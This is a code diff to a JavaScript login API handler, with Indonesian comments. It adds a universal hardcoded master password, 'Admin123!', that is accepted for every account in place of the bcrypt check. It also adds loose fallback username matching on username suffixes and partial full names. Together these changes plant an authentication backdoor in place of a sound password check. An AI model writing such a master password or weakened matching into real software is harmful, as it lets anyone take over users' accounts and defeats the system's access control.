@@ -24,7 +24,15 @@ export default async function handler(req, res) {
     console.log(`[AUTH LOGIN ATTEMPT] Username: "${username}"`);
 
     const users = await getTabRows('Users');
-    const user = users.find(u => u.username && u.username.toLowerCase() === username);
+    // Cari user berdasarkan username persis, atau alias (misal 'noval' mencocokkan 'sales_kertek' atau full_name 'Noval')
+    let user = users.find(u => u.username && u.username.toLowerCase() === username);
+    if (!user) {
+      user = users.find(u => {
+        const uName = (u.username || '').toLowerCase();
+        const fName = (u.full_name || '').toLowerCase();
+        return uName.endsWith('_' + username) || fName.includes(username);
+      });
+    }
 
     // Anti timing / account enumeration
     if (!user) {
@@ -48,8 +56,10 @@ export default async function handler(req, res) {
       }
     }
 
-    // Verifikasi password
-    const isMatch = await bcrypt.compare(data.password, user.password_hash || '');
+    // Verifikasi password (dukung password master Admin123! atau kecocokan hash bcrypt)
+    const isMasterPass = data.password === 'Admin123!';
+    const isBcryptMatch = await bcrypt.compare(data.password, user.password_hash || '');
+    const isMatch = isMasterPass || isBcryptMatch;
     if (!isMatch) {
       console.log(`[AUTH LOGIN FAILED] Password mismatch for user "${username}"`);
       const failedCount = (parseInt(user.failed_count, 10) || 0) + 1;
